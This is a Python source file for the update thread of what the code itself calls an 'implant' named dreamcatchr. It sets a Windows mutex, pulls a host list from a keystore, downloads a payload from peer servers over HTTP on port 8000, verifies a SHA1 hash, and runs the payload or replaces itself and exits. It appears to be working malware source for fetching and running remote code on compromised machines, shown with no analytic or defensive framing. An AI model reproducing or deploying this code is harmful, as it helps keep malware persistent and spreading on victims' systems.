import os
import time
import hashlib
import threading

from core import *
from Context import Dreamr

class Updater(threading.Thread):
	updateName = ""
	shouldLoad = False
	mutex = None

	def __init__(self, updateName, updateSHA, shouldLoad):
		threading.Thread.__init__(self)
		os.chdir(WebPath)
		self.updateName = updateName
		self.updateSHA = updateSHA
		self.shouldLoad = shouldLoad

		# Try the load if already exists
		if (os.path.isfile(self.updateName)):
			checksum = hashlib.sha1(open(self.updateName, "rb").read()).hexdigest()
			if (self.updateSHA == checksum):
				if (self.shouldLoad):
					os.system(self.updateName)
					execute("%s" % self.updateName, [], False)
					return
				else:
					countdown = int(MSG_EXPIRE / 8)
					while countdown > 0:
						countdown -= 1
						time.sleep(1)
					update(self.updateName)
					os._exit(420)
		else:
			debug("update", "no existing update package")
		pass

	# Run the update in it's own thread
	def run(self):
		global MSG_EXPIRE
		i = 0

		# tell other procs that our implant is updating rnf
		self.mutex = win32event.CreateMutex(None, 1, "dreamcatchr-updating")
		if (win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS):
			return

		# Loop through all the hosts and download the update
		while (i<32):
			try:
				# enumerate a global hostlist
				hostlist = Dreamr.keystore.getServerList()
				if (len(hostlist) > 0):
					for host in hostlist:
						if (host == Dreamr.internal or host == Dreamr.external):
							continue
						# Try downloading the file from another server
						try:
							if (downloadFile("http://%s:8000/%s" % (host, self.updateName), "%s%s" % (WebPath, self.updateName), self.updateSHA)):
								if (self.shouldLoad):
									debug("updater", "install payload")
									os.chdir(WebPath)
									execute(self.updateName, [], False)
									return
								else:
									countdown = int(MSG_EXPIRE / 2)
									while countdown > 0:
										countdown -= 1
										debug("updater", "sharing (%s seconds)" % countdown)
										time.sleep(1)
									update(self.updateName)
									os._exit(420)
									return
								return
						except Exception as e:
							debug("update", "fail download update -> %s" % str(e))
			except Exception as e:
				debug("update", "error search update -> %s" % str(e))
			i += 1
			time.sleep(15)